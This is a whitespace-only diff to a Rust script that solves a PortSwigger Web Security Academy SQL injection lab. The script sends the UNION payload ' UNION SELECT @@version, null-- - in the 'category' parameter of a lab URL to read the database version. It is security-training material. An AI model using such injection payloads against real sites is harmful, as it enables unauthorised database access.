@@ -4,7 +4,7 @@
 *
 * Date: 16/9/2023
 *
-* Lab: SQL injection attack, querying the database type and version on MySQL 
+* Lab: SQL injection attack, querying the database type and version on MySQL
 *      and Microsoft
 *
 * Steps: 1. Inject payload into 'category' query parameter
@@ -33,6 +33,7 @@ use text_colorizer::Colorize;
 fn main() {
     // change this to your lab URL
     let url = "https://0a9e00dc0409a8fd8230b67f009f00c4.web-security-academy.net";
+
     // build the client that will be used for all subsequent requests
     let client = build_client();
 
@@ -41,8 +42,10 @@ fn main() {
         "1. Injecting payload into 'category' query parameter.. ".white(),
     );
     io::stdout().flush();
+
     // the payload to inject in the query parameter
     let payload = "' UNION SELECT @@version, null-- -";
+
     // fetch the page with the injected payload
     let inject = client
         .get(format!("{url}/filter?category={payload}"))
@@ -51,6 +54,7 @@ fn main() {
             "{}",
             "[!] Failed to fetch the page with the injected payload".red()
         ));
+
     println!("{}", "OK".green());
     println!(
         "{} {}",
